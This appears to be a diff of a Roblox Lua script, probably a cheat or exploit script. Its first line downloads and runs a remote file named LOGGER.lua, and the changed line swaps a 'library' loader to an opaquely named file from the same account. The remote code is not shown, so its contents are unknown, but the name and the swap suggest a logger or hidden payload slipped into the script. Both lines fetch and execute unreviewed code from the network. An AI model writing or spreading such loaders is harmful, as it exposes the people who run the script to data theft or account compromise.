@@ -1,6 +1,6 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ikkkL624/LOGGER/refs/heads/main/LOGGER.lua"))()
 
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/MONARCA26X/LIBRER-A/refs/heads/main/GNIK-INKGG", true))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ikkkL624/Script/refs/heads/main/yCZkEiP.txt", true))()
 
 local player = game.Players.LocalPlayer
 local displayName = player.DisplayName or player.Name
